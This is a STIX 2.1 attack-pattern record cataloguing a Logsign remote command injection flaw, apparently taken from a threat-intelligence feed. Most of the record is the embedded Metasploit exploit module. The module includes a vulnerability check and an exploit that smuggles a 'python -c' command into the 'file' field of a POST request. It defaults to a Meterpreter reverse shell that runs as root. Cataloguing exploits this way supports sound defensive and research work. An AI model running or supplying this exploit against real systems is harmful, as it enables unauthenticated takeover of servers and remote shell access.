{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--b9977241-f9a8-4e4e-881d-07aea8c4db6c",
    "created": "2024-08-14T17:02:25.625028Z",
    "modified": "2024-08-14T17:02:25.625032Z",
    "name": "Logsign Remote Command Injection",
    "description": " This module exploits a command injection vulnerability in Logsign. By exploiting this vulnerability, unauthenticated users can execute arbitrary code under the root user.  Logsign has a publicly accessible endpoint. That endpoint takes a user input and then use it during operating system command execution without proper validation.  This module was tested against 4.4.2 and 4.4.137 versions.  'License'         => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/http/logsign_exec.rb",
            "external_id": "logsign_exec.rb"
        },
        {
            "source_name": "reference",
            "url": "https://pentest.blog/unexpected-journey-3-visiting-another-siem-and-uncovering-pre-auth-privileged-remote-code-execution/"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info={})\n    super(update_info(info,\n      'Name'           => 'Logsign Remote Command Injection',\n      'Description'    => %q{\n        This module exploits a command injection vulnerability in Logsign.\n        By exploiting this vulnerability, unauthenticated users can execute\n        arbitrary code under the root user.\n\n        Logsign has a publicly accessible endpoint. That endpoint takes a user\n        input and then use it during operating system command execution without\n        proper validation.\n\n        This module was tested against 4.4.2 and 4.4.137 versions.\n      },\n      'License'         => MSF_LICENSE,\n      'Author'          =>\n        [\n          'Mehmet Ince <mehmet@mehmetince.net>'  # author & msf module\n        ],\n      'References'      =>\n        [\n          ['URL', 'https://pentest.blog/unexpected-journey-3-visiting-another-siem-and-uncovering-pre-auth-privileged-remote-code-execution/']\n        ],\n      'Privileged'      => true,\n      'Platform'        => ['python'],\n      'Arch'            => ARCH_PYTHON,\n      'DefaultOptions'  =>\n        {\n          'payload' => 'python/meterpreter/reverse_tcp'\n        },\n      'Targets'         => [ ['Automatic', {}] ],\n      'DisclosureDate'  => '2017-02-26',\n      'DefaultTarget'   => 0\n    ))\n\n  end\n\n  def check\n    p_hash = {:file => \"#{rand_text_alpha(15 + rand(4))}.raw\"}\n\n    res = send_request_cgi(\n      'method' => 'POST',\n      'uri' => normalize_uri(target_uri.path, 'api', 'log_browser', 'validate'),\n      'ctype' => 'application/json',\n      'data' => JSON.generate(p_hash)\n    )\n\n    if res && res.body.include?('{\"message\": \"success\", \"success\": true}')\n      Exploit::CheckCode::Vulnerable\n    else\n      Exploit::CheckCode::Safe\n    end\n  end\n\n  def exploit\n    print_status(\"Delivering payload...\")\n\n    p_hash = {:file => \"logsign.raw\\\" quit 2>&1 |python -c \\\"#{payload.encoded}\\\" #\"}\n\n    send_request_cgi(\n      'method' => 'POST',\n      'uri' => normalize_uri(target_uri.path, 'api', 'log_browser', 'validate'),\n      'ctype' => 'application/json',\n      'data' => JSON.generate(p_hash)\n    )\n  end\nend\n",
    "x_mitre_disclosure_date": "2017-02-26",
    "x_mitre_platforms": [
        "['python']"
    ]
}